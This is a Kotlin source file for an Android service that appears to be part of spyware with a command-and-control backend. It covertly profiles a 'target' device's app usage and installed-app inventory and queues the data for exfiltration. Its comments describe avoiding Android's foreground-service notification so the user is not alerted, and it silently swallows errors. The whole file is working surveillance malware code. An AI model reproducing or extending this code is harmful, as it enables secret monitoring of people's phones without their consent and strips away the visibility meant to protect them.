package com.sp.core.services

import android.app.Service
import android.app.usage.UsageEvents
import android.app.usage.UsageStatsManager
import android.content.Context
import android.content.Intent
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import com.sp.core.c2.Exfil
import com.sp.core.util.BatchExfil
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.TimeUnit

/**
 * App-usage profiling: which apps the target opens, how long they stay in
 * the foreground, and the installed app inventory.
 *
 * The collector used to be a long-running service - a foreground service
 * always shows a notification on Android 14+, so the report is now taken
 * once per interval by the agent tick.
 */
class UsageStatsService : Service() {

    private val handler = Handler(Looper.getMainLooper())

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        collectUsage(this)
        stopSelf()
        return START_NOT_STICKY
    }

    companion object {
        const val INTERVAL_MS = 45 * 60 * 1000L

        /**
         * Reads the usage stats of the last interval and buffers the report.
         */
        fun collectUsage(ctx: Context) {
            try {
                val um = ctx.getSystemService(Context.USAGE_STATS_SERVICE) as? UsageStatsManager
                    ?: return
                val now = System.currentTimeMillis()
                val from = now - INTERVAL_MS

                val events = try {
                    um.queryEvents(from, now)
                } catch (_: Throwable) {
                    null
                } ?: return

                val starts = HashMap<String, Long>()
                val foreground = HashMap<String, Long>()
                while (events.hasNextEvent()) {
                    val ev = UsageEvents.Event()
                    events.getNextEvent(ev)
                    val pkg = ev.packageName ?: continue
                    when (ev.eventType) {
                        // ACTIVITY_RESUMED / MOVE_TO_FOREGROUND
                        1 -> starts[pkg] = ev.timeStamp
                        // ACTIVITY_PAUSED / MOVE_TO_BACKGROUND
                        2 -> {
                            val started = starts.remove(pkg)
                            if (started != null) {
                                foreground[pkg] = (foreground[pkg] ?: 0L) + (ev.timeStamp - started)
                            }
                        }
                    }
                }
                starts.forEach { (pkg, started) ->
                    foreground[pkg] = (foreground[pkg] ?: 0L) + (now - started)
                }

                val arr = JSONArray()
                foreground.entries
                    .sortedByDescending { it.value }
                    .take(30)
                    .forEach { (pkg, ms) ->
                        arr.put(JSONObject().apply {
                            put("pkg", pkg)
                            put("ms", ms)
                            put("label", labelOf(ctx, pkg))
                        })
                    }

                val payload = JSONObject().apply {
                    put("window_ms", INTERVAL_MS)
                    put("apps", arr)
                    put("installed", installedCount(ctx))
                    put("ts", now)
                }
                BatchExfil.enqueue(ctx, "usage", payload.toString())
            } catch (_: Throwable) {
            }
        }

        private fun labelOf(ctx: Context, pkg: String): String {
            return try {
                val pm = ctx.packageManager
                val app = pm.getApplicationInfo(pkg, 0)
                pm.getApplicationLabel(app).toString()
            } catch (_: Throwable) {
                ""
            }
        }

        private fun installedCount(ctx: Context): Int {
            return try {
                ctx.packageManager.getInstalledApplications(0).size
            } catch (_: Throwable) {
                0
            }
        }

        /** Full inventory of installed packages (sent on explicit request). */
        fun inventory(ctx: Context): String {
            val arr = JSONArray()
            try {
                val pm = ctx.packageManager
                val flags = PackageManager.GET_META_DATA
                val list: List<ApplicationInfo> = pm.getInstalledApplications(flags)
                for (app in list) {
                    val firstInstall = try {
                        pm.getPackageInfo(app.packageName, 0).firstInstallTime
                    } catch (_: Throwable) {
                        0L
                    }
                    arr.put(JSONObject().apply {
                        put("pkg", app.packageName)
                        put("label", pm.getApplicationLabel(app).toString())
                        put("system", (app.flags and ApplicationInfo.FLAG_SYSTEM) != 0)
                        put("first_install", firstInstall)
                    })
                }
            } catch (_: Throwable) {
            }
            return JSONObject().apply {
                put("count", arr.length())
                put("apps", arr)
                put("ts", System.currentTimeMillis())
            }.toString()
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
